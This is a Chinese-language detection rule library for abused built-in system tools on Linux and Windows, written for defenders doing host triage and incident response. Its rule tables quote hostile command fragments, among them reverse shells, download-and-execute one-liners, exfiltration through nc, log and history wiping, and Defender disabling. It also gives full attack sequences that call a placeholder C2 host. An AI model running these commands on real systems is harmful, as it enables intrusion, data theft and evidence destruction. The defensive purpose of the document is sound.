# Living-off-the-Land 特征库（LOLBins / LOLBAS）

> 系统自带工具被攻击者滥用的识别要点。Linux / Windows 都覆盖。
> **何时使用**：audit / ir 主机排查阶段，识别"看似系统命令但是恶意用途"的进程链与命令行。

仅给"识别"特征，不输出可复现攻击链。

---

## 一、Linux LOLBins

### 1.1 下载执行三件套

| rule_id | 命令片段 | 滥用模式 | 误报 note |
|---|---|---|---|
| SIG-LOL-001 | `curl http(s)://... \| bash` / `curl http://... \| sh` | 远程脚本直执行，不落盘 | 部分官方安装脚本（rust/oh-my-zsh）走此模式 |
| SIG-LOL-002 | `wget http://... -O /tmp/x && chmod +x /tmp/x && /tmp/x` | 落盘可执行 + 立即执行 | 极少正常用途 |
| SIG-LOL-003 | `wget -qO- http://... \| sh` | 静默下载执行 | 同上 |
| SIG-LOL-004 | `bash -c "$(curl -s http://...)"` | 内联执行 | 同上 |
| SIG-LOL-005 | `python -c "import urllib.request; exec(...)"` | python 内联下载执行 | 极少正常用途 |
| SIG-LOL-006 | `python -c "import socket,os,pty;..."` | 反弹 shell 单行 | 命中即可疑 |
| SIG-LOL-007 | `perl -e 'use Socket;...'` | perl 反弹 shell | 命中即可疑 |
| SIG-LOL-008 | `ruby -rsocket -e ...` | ruby 反弹 shell | 命中即可疑 |
| SIG-LOL-009 | `php -r "exec(...)" ` | php cli 直接 exec | 极少正常用途 |

### 1.2 反弹 shell 经典写法

| rule_id | 片段 | 备注 |
|---|---|---|
| SIG-LOL-021 | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | bash 内置 /dev/tcp |
| SIG-LOL-022 | `bash -c "exec bash -i &> /dev/tcp/..."` | 派生 bash |
| SIG-LOL-023 | `nc -e /bin/sh <ip> <port>` | 老 nc -e 选项 |
| SIG-LOL-024 | `mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <ip> <port> > /tmp/f` | 命名管道反弹 |
| SIG-LOL-025 | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>` | socat 全 tty |
| SIG-LOL-026 | `awk 'BEGIN{s="/inet/tcp/0/<ip>/<port>"; ...}'` | awk 反弹 |
| SIG-LOL-027 | `lua -e "require('socket');..."` | lua 反弹 |
| SIG-LOL-028 | `telnet <ip> <port> \| /bin/sh \| telnet <ip> <port+1>` | 双 telnet 老式 |
| SIG-LOL-029 | `0<&196;exec 196<>/dev/tcp/...;sh <&196 >&196 2>&196` | 文件描述符反弹 |

### 1.3 系统工具异常用途

| rule_id | 工具 | 滥用模式 | 误报 note |
|---|---|---|---|
| SIG-LOL-041 | `tcpdump -i any -w /tmp/xxx.pcap` 长期跑 | 抓包窃取流量 | 网工调试合法 |
| SIG-LOL-042 | `tar czf - / 2>/dev/null \| nc <ip> <port>` | 打包通过 nc 外传 | 极少正常 |
| SIG-LOL-043 | `find / -type f -exec /tmp/malicious {} \\;` | find -exec 横扫执行 | 文件清理脚本类似 |
| SIG-LOL-044 | `xargs -I{} sh -c ...` 配合 find | 同上 | 同上 |
| SIG-LOL-045 | `systemd-run --user --on-active=60s /tmp/xxx` | systemd 一次性触发 | 极少手动用 |
| SIG-LOL-046 | `at now + 1 minute < cmd.sh` | at 定时执行 | 罕见用途 |
| SIG-LOL-047 | `bash -i >& /dev/tcp/$VAR/$VAR` | 变量化反弹（绕检测） | 命中即可疑 |
| SIG-LOL-048 | `base64 -d <<< "xxx" \| bash` | base64 解码后执行 | obfuscation 信号 |
| SIG-LOL-049 | `echo "xxx" \| xxd -r -p \| bash` | hex 解码执行 | obfuscation 信号 |
| SIG-LOL-050 | `setsid /bin/sh -c "..." &` | 脱离 tty 后台 | 服务化常用 |
| SIG-LOL-051 | `nohup ./malicious &` | 持久后台 | 同上 |
| SIG-LOL-052 | `ld_preload` / `LD_PRELOAD=/tmp/x.so <cmd>` | 动态库劫持 | 性能工具偶用 |
| SIG-LOL-053 | `dd if=/dev/zero of=/var/log/auth.log` | 抹日志 | 反取证信号 |
| SIG-LOL-054 | `> /var/log/wtmp` / `truncate -s 0 /var/log/wtmp` | 清登录历史 | 反取证信号 |
| SIG-LOL-055 | `unset HISTFILE` / `export HISTFILE=/dev/null` | 关 history | 极少合法用途 |
| SIG-LOL-056 | `history -c && history -w` | 清 history | 反取证信号 |
| SIG-LOL-057 | `kill -9 -1` 大批量杀进程 | 反取证 / 抹痕 | 极少 |

### 1.4 提权常用

| rule_id | 命令片段 | 描述 |
|---|---|---|
| SIG-LOL-071 | `sudo -l` 查询 sudo 权限 | 信息搜集，命中需结合上下文 |
| SIG-LOL-072 | `find / -perm -4000 -type f 2>/dev/null` | 找 SUID 二进制 |
| SIG-LOL-073 | `getcap -r / 2>/dev/null` | 找 capabilities |
| SIG-LOL-074 | `cat /etc/sudoers; cat /etc/sudoers.d/*` | 直接读 sudoers |
| SIG-LOL-075 | `ps auxf` / `ps -eo pid,user,cmd` 全量进程 | 信息收集 |
| SIG-LOL-076 | `crontab -l; cat /etc/crontab; ls -la /etc/cron.*` | 计划任务收集 |

---

## 二、Windows LOLBins / LOLBAS

> Windows 上系统自带二进制被用作下载执行、绕过 AMSI、隐蔽通信。

| rule_id | 二进制 | 滥用模式 | 误报 note |
|---|---|---|---|
| SIG-LOL-101 | `powershell.exe -nop -w hidden -enc <base64>` | 加密执行 + 隐藏窗口 + 无策略 | 命中即高度可疑 |
| SIG-LOL-102 | `powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://...')"` | 经典下载执行 | 命中即可疑 |
| SIG-LOL-103 | `powershell.exe -c "Invoke-WebRequest http://... -OutFile $env:TEMP\\x.exe"` | 落盘后执行 | 自动化脚本偶用 |
| SIG-LOL-104 | `certutil.exe -urlcache -split -f http://... x.exe` | certutil 下载 | 极少合法用途 |
| SIG-LOL-105 | `certutil.exe -decode x.b64 x.exe` | base64 落盘 | obfuscation |
| SIG-LOL-106 | `bitsadmin.exe /transfer myjob /download http://... C:\\Users\\Public\\x.exe` | BITS 下载 | 极少合法 |
| SIG-LOL-107 | `mshta.exe http://.../x.hta` | mshta 执行远程 HTA | 命中即可疑 |
| SIG-LOL-108 | `mshta.exe vbscript:Execute(...)` | vbscript 内联 | 极少合法 |
| SIG-LOL-109 | `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write(...)` | javascript: 执行（"Squiblydoo"） | 命中即可疑 |
| SIG-LOL-110 | `regsvr32.exe /s /n /u /i:http://...scrobj.dll` | scrobj 远程脚本（"Squiblytwo"） | 极少合法 |
| SIG-LOL-111 | `wmic.exe process call create "cmd.exe /c ..."` | wmic 启动进程 | 老脚本偶用 |
| SIG-LOL-112 | `wmic.exe /node:<host> process call create ...` | 远程执行（横向） | 极少合法 |
| SIG-LOL-113 | `schtasks.exe /create /tn xxx /tr "..." /sc minute /mo 1` | 计划任务持久化 | 部署脚本常见 |
| SIG-LOL-114 | `schtasks.exe /create /s <host> /tn ... /tr ...` | 远程计划任务（横向） | 极少合法 |
| SIG-LOL-115 | `net use \\\\<host>\\IPC$ <pwd> /user:<user>` | SMB 连接 | 备份脚本偶用 |
| SIG-LOL-116 | `net.exe user <name> <pwd> /add; net.exe localgroup administrators <name> /add` | 加管理员账户 | 极少合法 |
| SIG-LOL-117 | `cmd.exe /c <encoded long string>` | 长 cmd 一行 | obfuscation |
| SIG-LOL-118 | `cscript / wscript .vbs` 从临时目录跑 | VBS 后门 | 老业务脚本偶用 |
| SIG-LOL-119 | `installutil.exe /U C:\\path\\xx.dll` | .NET 卸载器执行未签名 | 极少合法 |
| SIG-LOL-120 | `msbuild.exe C:\\path\\xx.xml` | MSBuild 执行任意 XML | 开发机合法 |
| SIG-LOL-121 | `csc.exe /target:exe /out:xx.exe xx.cs` | 编译运行（绕 AV） | 开发机合法 |
| SIG-LOL-122 | `cmstp.exe /au C:\\xx.inf` | INF 执行 | 极少合法 |
| SIG-LOL-123 | `forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c "cmd /c ..."` | forfiles 绕过 | 极少合法 |
| SIG-LOL-124 | `mavinject.exe <pid> /INJECTRUNNING <dll>` | DLL 注入 | 极少合法 |
| SIG-LOL-125 | `regini.exe x.ini` | 注册表批量改 | 极少 |
| SIG-LOL-126 | `Add-MpPreference -ExclusionPath C:\\Users\\Public` | Defender 排除路径 | 反防护信号 |
| SIG-LOL-127 | `Set-MpPreference -DisableRealtimeMonitoring $true` | 关 Defender 实时 | 极少合法 |
| SIG-LOL-128 | `wevtutil cl Security` | 清 Security 日志 | 反取证 |
| SIG-LOL-129 | `wevtutil cl System` | 清 System 日志 | 反取证 |
| SIG-LOL-130 | `vssadmin delete shadows /all /quiet` | 删卷影 | 勒索前置 |
| SIG-LOL-131 | `bcdedit /set {default} recoveryenabled No` | 关恢复 | 勒索前置 |
| SIG-LOL-132 | `net stop "Security Center"` | 停安全服务 | 反防护 |

---

## 三、滥用 pattern：下载 + 执行 + 删除痕迹三件套

经典攻击序列（Linux 示例）：
```
curl http://<c2>/x -o /tmp/.x       # 下载
chmod +x /tmp/.x                    # 加权限
/tmp/.x                             # 执行
rm -f /tmp/.x                       # 清痕迹（部分场景）
history -c; > ~/.bash_history       # 清 shell 历史
> /var/log/wtmp; > /var/log/auth.log # 清系统日志
```

Windows 等价序列：
```
powershell -ep bypass -c "iwr http://<c2>/x.exe -OutFile $env:Temp\\x.exe"
Start-Process $env:Temp\\x.exe
Remove-Item $env:Temp\\x.exe
wevtutil cl Security
```

蓝队识别这种序列时，重点不是单条命令，而是**命令链短时间内同主机同账户连续出现**。

---

## 四、进程链异常 pattern

可疑父子组合（命中任一组合 → 升 P0）：

### Linux
| 父进程 | 子进程 | 说明 |
|---|---|---|
| `nginx` / `apache2` / `httpd` / `php-fpm` / `java` (tomcat) | `bash` / `sh` / `dash` | webshell 落地 |
| `bash` / `sh` (web fork) | `curl` / `wget` / `nc` / `socat` | 下载或反弹 |
| `cron` | `curl http://...` | cron 持久化下载 |
| `sshd` | `python -c socket...` | ssh 落地反弹 |
| `mysql` / `redis-server` | `bash` | UDF / module 提权 |

### Windows
| 父进程 | 子进程 | 说明 |
|---|---|---|
| `winword.exe` / `excel.exe` / `outlook.exe` | `cmd.exe` / `powershell.exe` / `wscript.exe` | 钓鱼文档落地 |
| `mshta.exe` | `powershell.exe` | HTA 链 |
| `rundll32.exe` | `powershell.exe` / `cmd.exe` | DLL hijack 执行 |
| `w3wp.exe` / `tomcat*.exe` / `java.exe` | `cmd.exe` / `powershell.exe` | webshell |
| `services.exe` | `powershell.exe -enc ...` | 服务后门 |
| `lsass.exe` 被打开（不是子进程，是访问） | 任意非授权进程 | 凭据 dump 信号 |

---

## 五、误报场景

| 场景 | 易触规则 | 区分手段 |
|---|---|---|
| 官方一键安装（rustup / brew / nodesource） | SIG-LOL-001 ~ 004 | 检查源域名是否官方 + 用户是否管理员手动执行 |
| ansible / saltstack 批量运维 | SIG-LOL-005 / 050 | 来源 IP 是 ops jumphost + 命令模式标准化 |
| 备份脚本用 tar + ssh | SIG-LOL-042 | 目的地是已知备份服务器 + 周期固定 |
| 开发机日常用 `csc / msbuild` | SIG-LOL-120 / 121 | 用户是开发人员 + 工作时间 |
| 安全产品自身用 wevtutil | SIG-LOL-128 / 129 | 父进程是已知安全 service |
| `vssadmin delete shadows` 由备份软件触发 | SIG-LOL-130 | 父进程是 backup 服务名 |
| 监控 agent 调 wmic | SIG-LOL-111 | 父进程是 zabbix / sccm / qax 等 agent |

→ 实战中识别 LOLBin 滥用要看 **三要素**：父进程 + 命令行 + 触发时机。三者中两项异常即升级。

---

## 六、规则总览

总计定义 rule_id：
- SIG-LOL-001 ~ SIG-LOL-009（Linux 下载执行，9 条）
- SIG-LOL-021 ~ SIG-LOL-029（Linux 反弹 shell，9 条）
- SIG-LOL-041 ~ SIG-LOL-057（Linux 工具滥用，17 条）
- SIG-LOL-071 ~ SIG-LOL-076（Linux 提权信息搜集，6 条）
- SIG-LOL-101 ~ SIG-LOL-132（Windows LOLBins，32 条）

合计 **73 条**。
